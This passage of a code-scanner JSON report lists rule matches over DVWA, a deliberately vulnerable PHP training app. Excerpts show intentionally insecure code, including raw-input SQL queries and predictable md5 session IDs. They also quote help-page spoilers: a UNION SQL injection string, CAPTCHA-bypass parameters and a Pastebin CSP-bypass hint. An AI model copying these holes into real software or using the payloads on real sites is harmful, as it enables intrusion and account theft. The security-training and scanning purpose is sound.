        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\t$_SESSION[&#39;last_session_id_high&#39;] = 0;\n\t}\n\t$_SESSION[&#39;last_session_id_high&#39;]++;\n\t$cookie_value = md5($_SESSION[&#39;last_session_id_high&#39;]);\n\tsetcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], false, false);\n}\n\n?&gt;\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 18,
        "endLocationLine": 10,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "sha1",
        "excerpt": "$html = &quot;&quot;;\n\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) {\n\t$cookie_value = sha1(mt_rand() . time() . &quot;Impossible&quot;);\n\tsetcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], true, true);\n}\n?&gt;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 18,
        "endLocationLine": 6,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;There are 5 users in the database, with id&#39;s from 1 to 5. Your mission... to steal their passwords via SQLi.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able\n",
        "startLocationLine": 20,
        "startLocationColumn": 95,
        "endLocationLine": 20,
        "endLocationColumn": 104
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/help/help.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The medium level uses a form of SQL injection protection, with the function of\n\t\t\t&quot;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://secure.php.net/manual/en/function.mysql-real-escape-string.php&#39;, &#39;mysql_real_escape_string()&#39; ); ?&gt;&quot;.\n\t\t\tHowever due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered.&lt;/p&gt;\n\n\t\t&lt;p&gt;The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?id=a UNION SELECT 1,2;-- -&amp;Submit=Submit&lt;/span&gt;.&lt;/pre&gt;\n\n",
        "startLocationLine": 33,
        "startLocationColumn": 83,
        "endLocationLine": 33,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/high.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t$last  = $row[&quot;last_name&quot;];\n\n\t\t// Feedback for end user\n\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 59,
        "endLocationLine": 18,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;",
        "excerpt": "\t$id = $_SESSION[ &#39;id&#39; ];\n\n\t// Check database\n\t$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; );\n\n\t// Get results\n\twhile( $row = mysqli_fetch_assoc( $result ) ) {\n\t\t// Get values\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/impossible.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t\t$last  = $row[ &#39;last_name&#39; ];\n\n\t\t\t// Feedback for end user\n\t\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t\t}\n\t}\n}\n\n// Generate Anti-CSRF token\n",
        "startLocationLine": 25,
        "startLocationColumn": 60,
        "endLocationLine": 25,
        "endLocationColumn": 67
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );",
        "excerpt": "\t// Was a number entered?\n\tif(is_numeric( $id )) {\n\t\t// Check the database\n\t\t$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );\n\t\t$data-&gt;execute();\n\t\t$row = $data-&gt;fetch();\n\n\t\t// Make sure only 1 result is returned\n",
        "startLocationLine": 13,
        "startLocationColumn": 25,
        "endLocationLine": 13,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/medium.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t$last  = $row[&quot;last_name&quot;];\n\n\t\t// Feedback for end user\n\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t}\n\n}\n\n// This is used later on in the index.php page\n",
        "startLocationLine": 19,
        "startLocationColumn": 59,
        "endLocationLine": 19,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;",
        "excerpt": "\n\t$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);\n\n\t$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; );\n\n\t// Get results\n\twhile( $row = mysqli_fetch_assoc( $result ) ) {\n\t\t// Display values\n",
        "startLocationLine": 9,
        "startLocationColumn": 12,
        "endLocationLine": 9,
        "endLocationColumn": 76
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT COUNT(*) FROM users;&quot;;",
        "excerpt": "\n// This is used later on in the index.php page\n// Setting it here so we can close the database connection in here like in the rest of the source scripts\n$query  = &quot;SELECT COUNT(*) FROM users;&quot;;\n$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n$number_of_rows = mysqli_fetch_row( $result )[0];\n\nmysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);\n?&gt;\n",
        "startLocationLine": 26,
        "startLocationColumn": 11,
        "endLocationLine": 26,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/low.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t$last  = $row[&quot;last_name&quot;];\n\n\t\t// Feedback for end user\n\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t}\n\n\tmysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);\n}\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 59,
        "endLocationLine": 18,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;",
        "excerpt": "\t$id = $_REQUEST[ &#39;id&#39; ];\n\n\t// Check database\n\t$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t// Get results\n\twhile( $row = mysqli_fetch_assoc( $result ) ) {\n\t\t// Get values\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/help/help.php",
        "ruleId": "AI014000",
        "ruleName": "CloudServices: DataStorage (PasteBin or Similar)",
        "ruleDescription": "CloudServices: DataStorage (PasteBin or Similar)",
        "pattern": "pastebin|zerobin|ghostbin|hastebin",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.DataStorage.PasteBin"
        ],
        "sample": "Pastebin",
        "excerpt": "\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;Examine the policy to find all the sources that can be used to host external script files.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;Scripts can be included from Pastebin, try storing some JavaScript on there and then loading it in.&lt;/span&gt;&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The CSP policy tries to use a nonce to prevent inline scripts from being added by attackers.&lt;/p&gt;\n",
        "startLocationLine": 21,
        "startLocationColumn": 68,
        "endLocationLine": 21,
        "endLocationColumn": 76
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/source/low.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "}\n$page[ &#39;body&#39; ] .= &#39;\n&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;\n\t&lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;\n\t&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;\n\t&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;\n&lt;/form&gt;\n&#39;;\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 13,
        "endLocationLine": 18,
        "endLocationColumn": 124
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/source/low.php",
        "ruleId": "AI014000",
        "ruleName": "CloudServices: DataStorage (PasteBin or Similar)",
        "ruleDescription": "CloudServices: DataStorage (PasteBin or Similar)",
        "pattern": "pastebin|zerobin|ghostbin|hastebin",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.DataStorage.PasteBin"
        ],
        "sample": "pastebin",
        "excerpt": "&lt;?php\n\n$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, jquery and google analytics.\n\nheader($headerCSP);\n\n# https://pastebin.com/raw/R570EE00\n\n",
        "startLocationLine": 3,
        "startLocationColumn": 66,
        "endLocationLine": 3,
        "endLocationColumn": 74
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/source/low.php",
        "ruleId": "AI014000",
        "ruleName": "CloudServices: DataStorage (PasteBin or Similar)",
        "ruleDescription": "CloudServices: DataStorage (PasteBin or Similar)",
        "pattern": "pastebin|zerobin|ghostbin|hastebin",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.DataStorage.PasteBin"
        ],
        "sample": "pastebin",
        "excerpt": "&lt;?php\n\n$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, jquery and google analytics.\n\nheader($headerCSP);\n\n# https://pastebin.com/raw/R570EE00\n\n",
        "startLocationLine": 3,
        "startLocationColumn": 169,
        "endLocationLine": 3,
        "endLocationColumn": 177
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/source/low.php",
        "ruleId": "AI014000",
        "ruleName": "CloudServices: DataStorage (PasteBin or Similar)",
        "ruleDescription": "CloudServices: DataStorage (PasteBin or Similar)",
        "pattern": "pastebin|zerobin|ghostbin|hastebin",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.DataStorage.PasteBin"
        ],
        "sample": "pastebin",
        "excerpt": "\nheader($headerCSP);\n\n# https://pastebin.com/raw/R570EE00\n\n?&gt;\n&lt;?php\nif (isset ($_POST[&#39;include&#39;])) {\n$page[ &#39;body&#39; ] .= &quot;\n",
        "startLocationLine": 7,
        "startLocationColumn": 11,
        "endLocationLine": 7,
        "endLocationColumn": 19
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_r/help/help.php",
        "ruleId": "AI016400",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "email",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "email",
        "excerpt": "\t\t\tand will execute the JavaScript. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other\n\t\t\tsensitive information retained by your browser and used with that site. These scripts can even rewrite the content of the HTML page.&lt;/p&gt;\n\n\t\t&lt;p&gt;Because its a reflected XSS, the malicious code is not stored in the remote web application, so requires some social engineering (such as a link via email/chat).&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;One way or another, steal the cookie of a logged in user.&lt;/p&gt;\n",
        "startLocationLine": 18,
        "startLocationColumn": 155,
        "endLocationLine": 18,
        "endLocationColumn": 160
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "&lt;div class=&quot;body_padded&quot;&gt;\n\t&lt;h1&gt;Help - Insecure CAPTCHA&lt;/h1&gt;\n\n\t&lt;div id=&quot;code&quot;&gt;\n\t&lt;table width=&#39;100%&#39; bgcolor=&#39;white&#39; style=&quot;border:2px #C0C0C0 solid&quot;&gt;\n\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n",
        "startLocationLine": 2,
        "startLocationColumn": 13,
        "endLocationLine": 2,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n\t\t\tlimited protection from CSRF attacks as well as automated bot guessing.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 15,
        "startLocationColumn": 4,
        "endLocationLine": 15,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n\t\t\tlimited protection from CSRF attacks as well as automated bot guessing.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n",
        "startLocationLine": 15,
        "startLocationColumn": 95,
        "endLocationLine": 15,
        "endLocationColumn": 103
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Your aim, change the current user&#39;s password in a automated manner because of the poor CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The issue with this CAPTCHA is that it is easily bypassed. The developer has made the assumption that all users will progress through screen 1, complete the CAPTCHA, and then\n",
        "startLocationLine": 21,
        "startLocationColumn": 42,
        "endLocationLine": 21,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The issue with this CAPTCHA is that it is easily bypassed. The developer has made the assumption that all users will progress through screen 1, complete the CAPTCHA, and then\n\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n",
        "startLocationLine": 27,
        "startLocationColumn": 41,
        "endLocationLine": 27,
        "endLocationColumn": 49
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;The issue with this CAPTCHA is that it is easily bypassed. The developer has made the assumption that all users will progress through screen 1, complete the CAPTCHA, and then\n\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n",
        "startLocationLine": 27,
        "startLocationColumn": 93,
        "endLocationLine": 27,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tmove on to the next screen where the password is actually updated. By submitting the new password directly to the change page, the user may bypass the CAPTCHA system.&lt;/p&gt;\n\n\t\t&lt;p&gt;The parameters required to complete this challenge in low security would be similar to the following:&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?step=2&amp;password_new=password&amp;password_conf=password&amp;Change=Change&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has attempted to place state around the session and keep track of whether the user successfully completed the\n",
        "startLocationLine": 30,
        "startLocationColumn": 60,
        "endLocationLine": 30,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
